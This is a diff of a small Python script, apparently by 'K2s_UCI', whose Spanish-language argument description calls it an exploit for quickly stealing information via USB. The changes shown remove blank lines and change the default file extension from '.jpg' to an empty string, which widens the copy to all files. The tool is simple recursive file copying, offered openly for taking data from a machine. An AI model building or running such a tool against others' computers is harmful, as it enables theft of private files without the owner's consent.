@@ -1,7 +1,6 @@
 import os
 import shutil #Libreria para copiar archivos
 import argparse #Libreria de interfaz grafica
-
 args = None
 
 def log_file(archivo_error):
@@ -40,19 +39,15 @@ def mostrar_archivos(directorio):
         else:
             copiar(directorio,args.extension)
 
-
-
 if __name__ == '__main__':
     print(r"Created by K2s_UCI")
     parser = argparse.ArgumentParser(description="Exploit con el objetivo de robar informacion de manera\
     rapida, pruebame via USB y agrega la extencion")
     parser.add_argument('-s',"--source" ,type=str ,help="Choose the sources to copy")
     parser.add_argument('-d',"--destination" ,type=str ,default=os.getcwd() ,help="Chose the destination to copy,default USB")
-    parser.add_argument('-e',"--extension", type=str ,default=".jpg", help="Chose the extension to copy")
+    parser.add_argument('-e',"--extension", type=str ,default="", help="Write the extension to copy")
     args = parser.parse_args()
-
     mostrar_archivos(args.source)
-
     
 
  
